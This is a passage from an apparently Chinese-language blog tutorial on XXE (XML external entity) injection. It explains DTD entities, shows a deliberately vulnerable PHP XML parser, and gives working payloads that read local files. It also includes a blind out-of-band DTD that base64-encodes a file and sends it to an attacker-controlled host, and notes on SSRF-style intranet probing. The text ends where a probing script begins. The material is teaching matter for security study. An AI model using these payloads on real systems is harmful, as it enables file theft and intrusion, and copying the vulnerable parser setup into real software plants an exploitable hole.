内网主机探测">实验三：HTTP 内网主机探测</a></li><li><a href=#%e5%ae%9e%e9%aa%8c%e5%9b%9bhttp-%e5%86%85%e7%bd%91%e4%b8%bb%e6%9c%ba%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f aria-label="实验四：HTTP 内网主机端口扫描">实验四：HTTP 内网主机端口扫描</a></li><li><a href=#%e5%ae%9e%e9%aa%8c%e4%ba%94%e5%86%85%e7%bd%91%e7%9b%b2%e6%b3%a8ctf aria-label=实验五：内网盲注(CTF)>实验五：内网盲注(CTF)</a></li><li><a href=#%e5%ae%9e%e9%aa%8c%e5%85%ad%e9%92%93%e9%b1%bc aria-label=实验六：钓鱼：>实验六：钓鱼：</a></li></ul></li><li><a href=#%e7%9c%9f%e5%ae%9e%e7%9a%84-xxe-%e5%87%ba%e7%8e%b0%e5%9c%a8%e5%93%aa aria-label="真实的 XXE 出现在哪">真实的 XXE 出现在哪</a><ul><li><a href=#%e5%ae%9e%e4%be%8b%e4%b8%80%e6%a8%a1%e6%8b%9f%e6%83%85%e5%86%b5 aria-label=实例一：模拟情况>实例一：模拟情况</a></li><li><a href=#%e5%ae%9e%e4%be%8b%e4%ba%8cjson-content-type-xxe aria-label="实例二：JSON content-type XXE">实例二：JSON content-type XXE</a><ul><li><a href=#%e5%8e%9f%e5%a7%8b%e8%af%b7%e6%b1%82%e5%92%8c%e5%93%8d%e5%ba%94 aria-label=原始请求和响应：>原始请求和响应：</a></li><li><a href=#%e8%bf%9b%e4%b8%80%e6%ad%a5%e8%af%b7%e6%b1%82%e5%92%8c%e5%93%8d%e5%ba%94 aria-label=进一步请求和响应：>进一步请求和响应：</a></li><li><a href=#%e6%9c%80%e7%bb%88%e7%9a%84%e8%af%b7%e6%b1%82%e5%92%8c%e5%93%8d%e5%ba%94 aria-label=最终的请求和响应：>最终的请求和响应：</a></li></ul></li></ul></li><li><a href=#xxe-%e5%a6%82%e4%bd%95%e9%98%b2%e5%be%a1 aria-label="XXE 如何防御">XXE 如何防御</a><ul><li><a href=#%e6%96%b9%e6%a1%88%e4%b8%80%e4%bd%bf%e7%94%a8%e8%af%ad%e8%a8%80%e4%b8%ad%e6%8e%a8%e8%8d%90%e7%9a%84%e7%a6%81%e7%94%a8%e5%a4%96%e9%83%a8%e5%ae%9e%e4%bd%93%e7%9a%84%e6%96%b9%e6%b3%95 aria-label=方案一：使用语言中推荐的禁用外部实体的方法>方案一：使用语言中推荐的禁用外部实体的方法</a></li><li><a href=#%e6%96%b9%e6%a1%88%e4%ba%8c%e6%89%8b%e5%8a%a8%e9%bb%91%e5%90%8d%e5%8d%95%e8%bf%87%e6%bb%a4%e4%b8%8d%e6%8e%a8%e8%8d%90 aria-label=方案二：手动黑名单过滤(不推荐)>方案二：手动黑名单过滤(不推荐)</a></li></ul></li></ul></div></details></div></aside><script>let activeElement,elements;window.addEventListener("DOMContentLoaded",function(){checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),activeElement=elements[0];const t=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active")},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{activeElement=Array.from(elements).find(e=>{if(getOffsetTop(e)-window.pageYOffset>0&&getOffsetTop(e)-window.pageYOffset<window.innerHeight/2)return e})||activeElement,elements.forEach(e=>{const t=encodeURI(e.getAttribute("id")).toLowerCase();e===activeElement?document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active"):document.querySelector(`.inner ul li a[href="#${t}"]`).classList.remove("active")})},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><h2 id=xxe---外部实体注入xml-external-entity-injection>XXE - 外部实体注入（Xml External Entity Injection）<a hidden class=anchor aria-hidden=true href=#xxe---外部实体注入xml-external-entity-injection>#</a></h2><h3 id=基本信息与概念>基本信息与概念<a hidden class=anchor aria-hidden=true href=#基本信息与概念>#</a></h3><h4 id=定义>定义<a hidden class=anchor aria-hidden=true href=#定义>#</a></h4><p>XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，&mldr;），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，&mldr;），他应用的如此的普遍以至于他出现的任何问题都会带来灾难性的结果。</p><p>在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务（DNS，FTP，HTTP，SMB等）。 外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。 但是，在处理外部实体时，可以针对应用程序启动许多攻击。 这些攻击包括泄露本地系统文件，这些文件可能包含密码和私人用户数据等敏感数据，或利用各种方案的网络访问功能来操纵内部应用程序。 通过将这些攻击与其他实现缺陷相结合，这些攻击的范围可以扩展到客户端内存损坏，任意代码执行，甚至服务中断，具体取决于这些攻击的上下文。</p><p>XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的，他就是长得下面这个样子</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?xml version=&#34;1.0&#34;?&gt; //这一行是 XML 文档定义
</span></span><span class=line><span class=cl>&lt;!DOCTYPE message [
</span></span><span class=line><span class=cl>&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;
</span></span><span class=line><span class=cl>&lt;!ELEMENT receiver (#PCDATA)&gt;
</span></span><span class=line><span class=cl>&lt;!ELEMENT sender (#PCDATA)&gt;
</span></span><span class=line><span class=cl>&lt;!ELEMENT header (#PCDATA)&gt;
</span></span><span class=line><span class=cl>&lt;!ELEMENT msg (#PCDATA)&gt;
</span></span></code></pre></td></tr></table></div></div><p>上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这么写</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;message&gt;
</span></span><span class=line><span class=cl>&lt;receiver&gt;Myself&lt;/receiver&gt;
</span></span><span class=line><span class=cl>&lt;sender&gt;Someone&lt;/sender&gt;
</span></span><span class=line><span class=cl>&lt;header&gt;TheReminder&lt;/header&gt;
</span></span><span class=line><span class=cl>&lt;msg&gt;This is an amazing book&lt;/msg&gt;
</span></span><span class=line><span class=cl>&lt;/message&gt;
</span></span></code></pre></td></tr></table></div></div><p>其实除了在 DTD 中定义元素**（其实就是对应 XML 中的标签）**以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)，毕竟 ML 中除了能标签以外，还需要有些内容是固定的。比如：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;
</span></span><span class=line><span class=cl>&lt;!DOCTYPE xxe [
</span></span><span class=line><span class=cl>&lt;!ELEMENT xee ANY &gt;
</span></span><span class=line><span class=cl>&lt;!ENTITY testMsg &#34;test&#34; &gt;]&gt;
</span></span></code></pre></td></tr></table></div></div><p>这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &[entity]; 符号进行引用），那么 XML 就可以写成这样</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;creds&gt;
</span></span><span class=line><span class=cl>&lt;user&gt;&amp;xxe;&lt;/user&gt;
</span></span><span class=line><span class=cl>&lt;pass&gt;mypass&lt;/pass&gt;
</span></span><span class=line><span class=cl>&lt;/creds&gt;
</span></span></code></pre></td></tr></table></div></div><p>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 &ldquo;test&rdquo; 替换。</p><h4 id=内部与外部实体>内部与外部实体<a hidden class=anchor aria-hidden=true href=#内部与外部实体>#</a></h4><p>实体分为两种，内部实体和<strong>外部实体</strong>，上面我们举的例子就是内部实体，但是实际上实体可以从外部的<strong>dtd</strong> 文件中引用，我们看下面的代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;
</span></span><span class=line><span class=cl>&lt;!DOCTYPE xxe [
</span></span><span class=line><span class=cl>&lt;!ELEMENT xxe ANY &gt;
</span></span><span class=line><span class=cl>&lt;!ENTITY file SYSTEM &#34;file:///c:/test.dtd&#34; &gt;]&gt; //引用的外部的dtd文件
</span></span><span class=line><span class=cl>&lt;creds&gt;
</span></span><span class=line><span class=cl>    &lt;user&gt;&amp;file;&lt;/user&gt;
</span></span><span class=line><span class=cl>    &lt;pass&gt;mypass&lt;/pass&gt;
</span></span><span class=line><span class=cl>&lt;/creds&gt;
</span></span></code></pre></td></tr></table></div></div><p>这样对引用资源所做的任何更改都会在文档中自动更新,非常方便（<strong>方便永远是安全的敌人</strong>）</p><p>当然，还有一种引用方式是使用 引用<strong>公用 DTD</strong> 的方法，语法如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;
</span></span></code></pre></td></tr></table></div></div><p>这个在我们的攻击中也可以起到和 SYSTEM 一样的作用</p><h4 id=通用实体与参数实体>通用实体与参数实体<a hidden class=anchor aria-hidden=true href=#通用实体与参数实体>#</a></h4><p>我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体还可以分成两个派别：<strong>通用实体和参数实体</strong></p><p><strong>1.通用实体</strong></p><p>用 &实体名; 引用的实体，在DTD 中定义，在 XML 文档中引用（上面提到的过的就是）</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; 
</span></span><span class=line><span class=cl>&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &#34;file:///c:/windows/win.ini&#34;&gt; ]&gt; 
</span></span><span class=line><span class=cl>&lt;updateProfile&gt;  
</span></span><span class=line><span class=cl>    &lt;firstname&gt;Joe&lt;/firstname&gt;  
</span></span><span class=line><span class=cl>    &lt;lastname&gt;&amp;file;&lt;/lastname&gt;  
</span></span><span class=line><span class=cl>    ... 
</span></span><span class=line><span class=cl>&lt;/updateProfile&gt;
</span></span></code></pre></td></tr></table></div></div><p><strong>2.参数实体：</strong></p><p>(1)使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong>
(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体
(3)和通用实体一样，参数实体也可以外部引用</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;!ENTITY % an-element &#34;&lt;!ELEMENT mytag (subtag)&gt;&#34;&gt; 
</span></span><span class=line><span class=cl>&lt;!ENTITY % remote-dtd SYSTEM &#34;http://somewhere.example.org/remote.dtd&#34;&gt; 
</span></span><span class=line><span class=cl>%an-element; %remote-dtd;
</span></span></code></pre></td></tr></table></div></div><p><strong>参数实体在我们 Blind XXE 中起到了至关重要的作用</strong></p><h3 id=实验一有回显读取本地文件常规xxe>实验一：有回显读取本地文件（常规xxe）<a hidden class=anchor aria-hidden=true href=#实验一有回显读取本地文件常规xxe>#</a></h3><p>这个实验的攻击场景模拟的是在服务<strong>能接收并解析 XML 格式的输入并且有回显</strong>的时候，我们就能输入我们自定义的 XML 代码，通过引用外部实体的方法，引用服务器上面的文件</p><p>本地服务器上解析 XML 的 php 代码：</p><p><strong>xml.php</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>    <span class=nx>libxml_disable_entity_loader</span> <span class=p>(</span><span class=k>false</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$xmlfile</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;php://input&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$dom</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>DOMDocument</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nv>$dom</span><span class=o>-&gt;</span><span class=na>loadXML</span><span class=p>(</span><span class=nv>$xmlfile</span><span class=p>,</span> <span class=nx>LIBXML_NOENT</span> <span class=o>|</span> <span class=nx>LIBXML_DTDLOAD</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>    <span class=nv>$creds</span> <span class=o>=</span> <span class=nx>simplexml_import_dom</span><span class=p>(</span><span class=nv>$dom</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nv>$creds</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p><strong>payload:</strong> 将这整段作为 post-data 使用 post 传入服务器即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; 
</span></span><span class=line><span class=cl>&lt;!DOCTYPE creds [  
</span></span><span class=line><span class=cl>&lt;!ENTITY goodies SYSTEM &#34;file:///c:/windows/system.ini&#34;&gt; ]&gt; 
</span></span><span class=line><span class=cl>&lt;creds&gt;&amp;goodies;&lt;/creds&gt;
</span></span></code></pre></td></tr></table></div></div><p>若文件无特殊符号，则可正常回显</p><p>但若文件含有特殊符号如 & &lt; [ ] > ;呢，如果直接想要导出这些数据，xml在渲染时就会出错。因此，可以使用CDATA包裹文件数据再导出</p><p>CDATA是一种xml的方法，能够将其中的&lt;>[]等字符当作常量输出，但是它无法转义&rsquo;]]>&rsquo;，因为这是他自己的结束标志，就像字符串不能含有\0字符一样。</p><p>将数据用CDATA包裹，即：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;![CDATA[
</span></span><span class=line><span class=cl>	xxxxxxxx
</span></span><span class=line><span class=cl>	]]&gt;
</span></span><span class=line><span class=cl>-------------------------------------
</span></span><span class=line><span class=cl>可以定义三个参数ENTITY，分别代表
</span></span><span class=line><span class=cl>% start     &#34;&lt;![CDATA[
</span></span><span class=line><span class=cl>% datas	     &#34;xxxxxxxx&#34;
</span></span><span class=line><span class=cl>% end	     &#34;]]&gt;&#34;
</span></span></code></pre></td></tr></table></div></div><p><strong>payload:</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>&lt;</span><span class=err>?</span><span class=n>xml</span> <span class=n>version</span><span class=o>=</span><span class=s2>&#34;1.0&#34;</span> <span class=n>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=err>?</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;!</span><span class=n>DOCTYPE</span> <span class=n>xxe</span> <span class=p>[</span>
</span></span><span class=line><span class=cl><span class=o>&lt;!</span><span class=n>ENTITY</span> <span class=o>%</span> <span class=n>dtd</span> <span class=n>SYSTEM</span> <span class=s2>&#34;file:///c:/tpl.txt&#34;</span><span class=o>&gt;</span>   <span class=o>//</span><span class=err>引用的一个外部文件，这个文件也可以存放在一个黑客自己搭建的服务器</span>
</span></span><span class=line><span class=cl><span class=o>%</span><span class=n>dtd</span><span class=p>;</span> <span class=p>]</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=o>&lt;</span><span class=n>user</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>		<span class=o>&lt;</span><span class=n>username</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>			<span class=o>&amp;</span><span class=n>payload</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=o>&lt;/</span><span class=n>username</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>		<span class=o>&lt;</span><span class=n>password</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>			<span class=n>password</span>
</span></span><span class=line><span class=cl>		<span class=o>&lt;/</span><span class=n>password</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>	<span class=o>&lt;/</span><span class=n>user</span><span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p><strong>tpl.txt</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>&lt;</span><span class=err>?</span><span class=n>xml</span> <span class=n>version</span><span class=o>=</span><span class=s2>&#34;1.0&#34;</span> <span class=n>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=err>?</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;!</span><span class=n>ENTITY</span> <span class=o>%</span> <span class=n>start</span> <span class=s2>&#34;&lt;![CDATA[&#34;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;!</span><span class=n>ENTITY</span> <span class=o>%</span> <span class=n>file</span> <span class=n>SYSTEM</span> <span class=s2>&#34;file:///c:/xxe.txt&#34;</span><span class=o>&gt;</span>  <span class=o>//</span><span class=err>这里是需要读取的文件</span>
</span></span><span class=line><span class=cl><span class=o>&lt;!</span><span class=n>ENTITY</span> <span class=o>%</span> <span class=n>end</span> <span class=s2>&#34;]]&gt;&#34;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;!</span><span class=n>ENTITY</span> <span class=n>payload</span> <span class=s2>&#34;</span><span class=si>%s</span><span class=s2>tart;</span><span class=si>%f</span><span class=s2>ile;</span><span class=si>%e</span><span class=s2>nd;&#34;</span><span class=o>&gt;</span> <span class=o>//</span><span class=err>拼接了上述定义的参数实体</span>
</span></span></code></pre></td></tr></table></div></div><p>如此就可读取含有&lt;>[]等特殊字符的文件了</p><p><img loading=lazy src=/postPic/image-20240520103425930.png alt=加载失败></p><p>当然也可以不引用外部文件，直接将迭代定义参数实体即可，但是需要注意的是，被包裹的实体在定义时，双引号需要变为单引号，且需要将"%&ldquo;转义为html实体编码，即<code>&amp;#37;</code></p><p><strong>payload</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>&lt;</span><span class=err>?</span><span class=n>xml</span> <span class=n>version</span><span class=o>=</span><span class=s2>&#34;1.0&#34;</span> <span class=n>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=err>?</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=o>&lt;!</span><span class=n>DOCTYPE</span> <span class=n>xxe</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=o>&lt;!</span><span class=n>ENTITY</span> <span class=o>%</span> <span class=n>start</span> <span class=s2>&#34;&lt;![CDATA[&#34;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=o>&lt;!</span><span class=n>ENTITY</span> <span class=o>%</span> <span class=n>file</span> <span class=n>SYSTEM</span> <span class=s2>&#34;file:///c:/xxe.txt&#34;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=o>&lt;!</span><span class=n>ENTITY</span> <span class=o>%</span> <span class=n>end</span> <span class=s2>&#34;]]&gt;&#34;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=o>&lt;!</span><span class=n>ENTITY</span> <span class=o>%</span> <span class=n>dtd</span> <span class=s2>&#34;&lt;!ENTITY payload &#39;&amp;#37;start;&amp;#37;file;&amp;#37;end;&#39;&gt;&#34;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=o>%</span><span class=n>dtd</span><span class=p>;</span> <span class=p>]</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=o>&lt;</span><span class=n>user</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>		<span class=o>&lt;</span><span class=n>username</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>			<span class=o>&amp;</span><span class=n>payload</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=o>&lt;/</span><span class=n>username</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=o>&lt;</span><span class=n>password</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>			<span class=n>password</span>
</span></span><span class=line><span class=cl>		<span class=o>&lt;/</span><span class=n>password</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>	<span class=o>&lt;/</span><span class=n>user</span><span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/postPic/image-20240520110632698.png alt=加载失败></p><h3 id=实验二无回显读取本地敏感文件blind-oob-xxe>实验二：无回显读取本地敏感文件(Blind OOB XXE)<a hidden class=anchor aria-hidden=true href=#实验二无回显读取本地敏感文件blind-oob-xxe>#</a></h3><p>如果服务器端没有xml回显，那么可以选择将读取的文件上传到攻击者个人服务器</p><p>方式同上，定义参数实体，利用一些协议将文件编码后，传输至攻击者的服务器(使用python http nc查看即可)</p><p>注意 因为包裹实体时，实体的值中不能有 %, 所以将其转成html实体编码 <code>%</code></p><p><strong>test.dtd</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=file:///C:/test.txt&#34;&gt;
</span></span><span class=line><span class=cl>&lt;!ENTITY % int &#34;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://ip:9999?p=%file;&#39;&gt;&#34;&gt;
</span></span></code></pre></td></tr></table></div></div><p><strong>payload：</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;!DOCTYPE convert [ 
</span></span><span class=line><span class=cl>&lt;!ENTITY % remote SYSTEM &#34;http://ip/test.dtd&#34;&gt;
</span></span><span class=line><span class=cl>%remote;%int;%send;
</span></span><span class=line><span class=cl>]&gt;
</span></span></code></pre></td></tr></table></div></div><p><strong>新的思考：</strong></p><p>我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。</p><p><strong>新的利用：</strong></p><p>所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议</p><p><strong>如图所示:</strong></p><p><img loading=lazy src=/postPic/image-20240520111517989.png alt=加载失败></p><p><strong>注意：</strong></p><p>1.其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7
update 7 和 Oracle JDK 1.6 update 35
2.libxml 是 PHP 的 xml 支持</p><h3 id=实验三http-内网主机探测>实验三：HTTP 内网主机探测<a hidden class=anchor aria-hidden=true href=#实验三http-内网主机探测>#</a></h3><p>我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了</p><p><strong>下面是一个探测脚本的实例：</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
